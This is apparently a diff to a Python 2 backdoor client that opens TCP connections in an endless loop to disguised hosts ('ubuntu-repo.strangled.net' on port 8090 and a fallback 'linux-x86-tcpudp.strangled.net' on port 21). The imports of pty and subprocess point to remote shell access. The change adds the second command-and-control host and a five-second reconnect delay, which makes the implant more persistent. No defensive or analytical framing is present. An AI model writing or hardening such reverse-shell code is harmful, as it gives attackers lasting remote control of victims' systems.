@@ -1,10 +1,18 @@
 import socket, os, pty, select, subprocess, time
 
 while 1:
+    s = None
     try:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("ubuntu-repo.strangled.net", 8090))
+            
+            try:
+                s.connect(("ubuntu-repo.strangled.net", 8090))
+            except Exception, e:
+                try: s.close()
+                except: pass
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect(("linux-x86-tcpudp.strangled.net", 21))
 
             try: local_ip = s.getsockname()
             except: local_ip = "Legacy"
@@ -43,5 +51,9 @@ while 1:
             pass
 
     finally:
-        try: s.close()
-        except: pass
+        if s:
+            try: s.close()
+            except: pass
+            
+    # Sleep for 5 seconds to prevent hammering the CPU before trying to reconnect!
+    time.sleep(5)
